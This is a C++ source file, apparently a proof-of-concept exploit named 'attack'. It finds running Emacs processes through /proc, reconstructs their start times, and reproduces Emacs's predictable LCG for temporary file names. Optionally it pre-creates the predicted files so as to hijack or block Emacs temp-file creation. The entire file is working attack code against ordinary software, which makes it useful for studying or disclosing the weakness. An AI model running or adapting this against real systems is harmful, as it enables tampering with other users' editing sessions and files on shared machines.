#include <cassert>
#include <cstdlib>
#include <cstring>

#include <fstream>
#include <iostream>
#include <locale>
#include <sstream>
#include <vector>

#include <dirent.h>
#include <getopt.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#define USECS 1000000

static const char make_temp_name_tbl[64] = {
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
    'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
    'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '-', '_'};

// The LCG used by Emacs.
class LCG {
 public:
  LCG() = delete;
  LCG(const LCG &other) = delete;
  explicit LCG(int seed) : seed_(seed) {}

  inline void Next(char *out) {
    unsigned num = seed_;

    out[0] = make_temp_name_tbl[num & 63], num >>= 6;
    out[1] = make_temp_name_tbl[num & 63], num >>= 6;
    out[2] = make_temp_name_tbl[num & 63], num >>= 6;

    seed_ += 25229;
    seed_ %= 225307;
  }

 private:
  unsigned seed_;
};

// Take the difference of two timevals, x - y.
timeval TimeDiff(const timeval &x, const timeval &y) {
  timeval result;
  result.tv_sec = x.tv_sec - y.tv_sec;
  result.tv_usec = x.tv_usec - y.tv_usec;
  if (result.tv_usec < 0) {
    result.tv_usec += USECS;
    result.tv_sec--;
    assert(result.tv_usec < USECS);
  }
  return result;
}

// Add two timevals, x + y.
timeval TimeAdd(const timeval &x, const timeval &y) {
  timeval result;
  result.tv_sec = x.tv_sec + y.tv_sec;
  result.tv_usec = x.tv_usec + y.tv_usec;
  if (result.tv_usec >= USECS) {
    result.tv_usec -= USECS;
    result.tv_sec++;
    assert(result.tv_usec < USECS);
  }
  return result;
}

// Get the boot time for this system.
timeval BootTime() {
  timeval now, uptime;
  gettimeofday(&now, nullptr);

  std::string up;
  std::ifstream uptime_file("/proc/uptime");
  uptime_file >> up;

  size_t pos = up.find('.');
  if (pos == std::string::npos) {
    std::cerr << "Failed to parse uptime.\n";
    return {};
  }

  // this code is awful
  std::string up_secs_str = up.substr(0, pos);
  uptime.tv_sec = strtol(up_secs_str.c_str(), nullptr, 10);

  std::string up_usecs_str = up.substr(pos + 1);
  const size_t zeros_needed = 6 - up_usecs_str.length();
  std::ostringstream os;
  os << up_usecs_str;
  for (size_t i = 0; i < zeros_needed; i++) {
    os << "0";
  }
  uptime.tv_usec = strtol(os.str().c_str(), nullptr, 10);

  return TimeDiff(now, uptime);
}

// Return true if the string looks like a pid.
bool IsPid(const char *s) {
  while (*s) {
    if (!isdigit(*s++)) {
      return false;
    }
  }
  return true;
}

// Print usage
void PrintUsage() {
  std::cout << "Usage: attack [-p|--prefix PREFIX] [-s|--seconds "
               "SECONDS] [-f|--files FILES] [-c|--create] [-q|--quiet]\n";
}

int main(int argc, char **argv) {
  bool found_emacs = false;
  bool create = false;
  bool verbose = true;
  std::string prefix;
  size_t seconds = 100;
  size_t files = 10;

  for (;;) {
    static option long_options[] = {
        {"create", no_argument, 0, 'c'},
        {"help", no_argument, 0, 'h'},
        {"prefix", required_argument, 0, 'p'},
        {"seconds", required_argument, 0, 's'},
        {"files", required_argument, 0, 'f'},
        {"quiet", no_argument, 0, 'q'},
    };
    int c = getopt_long(argc, argv, "chp:s:f:q", long_options, nullptr);
    if (c == -1) {
      break;
    }

    switch (c) {
      case 'c':
        create = true;
        break;
      case 'h':
        PrintUsage();
        return 0;
        break;
      case 'f':
        files = static_cast<size_t>(strtoul(optarg, nullptr, 10));
        break;
      case 'p':
        prefix = optarg;
        break;
      case 's':
        seconds = static_cast<size_t>(strtoul(optarg, nullptr, 10));
        break;
      case 'q':
        verbose = false;
        break;
      case '?':
        break;
      default:
        std::cerr << "Got unexpected flag: " << c << "\n";
        return 1;
        break;
    }
  }

  if (!create && !verbose) {
    std::cout
        << "Cowardly refusing to run unless either -c or -v is supplied:\n";
    PrintUsage();
    return 1;
  }

  DIR *proc = opendir("/proc");
  if (proc == nullptr) {
    std::cerr << "Failed to open /proc\n";
    return 1;
  }

  const timeval boot_time = BootTime();
  const long jiffies = sysconf(_SC_CLK_TCK);

  char buf[4];
  memset(buf, 0, sizeof(buf));  // ensure buf is null terminated

  for (;;) {
    dirent *d = readdir(proc);
    if (d == nullptr) {
      break;
    }
    if (!IsPid(d->d_name)) {
      continue;
    }

    char proc_name[128];
    int process_start;

    std::ostringstream os;
    os << "/proc/" << d->d_name << "/stat";

    FILE *stat_file = fopen(os.str().c_str(), "r");
    if (stat_file == nullptr) {
      continue;
    }
    int matched =
        fscanf(stat_file,
               "%*d %s %*s %*d %*d %*d %*d %*d %*d %*d %*d %*d %*d %*d %*d %*d "
               "%*d %*d %*d %*d %*d %d",
               proc_name, &process_start);
    fclose(stat_file);

    if (matched != 2 || strcmp(proc_name, "(emacs)") != 0) {
      continue;
    }

    timeval up;
    up.tv_sec = process_start / jiffies;

    float frac_sec = static_cast<float>(process_start % jiffies) /
                     static_cast<float>(jiffies);
    up.tv_usec = static_cast<int>(frac_sec * USECS);

    timeval emacs_start = TimeAdd(boot_time, up);

    for (size_t i = 0; i < seconds; i++) {
      LCG lcg(emacs_start.tv_sec + i);
      for (size_t j = 0; j < files; j++) {
        lcg.Next(buf);
        std::ostringstream os;
        os << prefix << d->d_name << buf;
        const std::string outname = os.str();
        if (create) {
          std::ofstream{outname};
        }
        if (verbose) {
          std::cout << outname << "\n";
        }
      }
    }
    found_emacs = true;
  }

  closedir(proc);

  if (!found_emacs) {
    std::cout << "No Emacs processes were found.\n";
  }

  return 0;
}
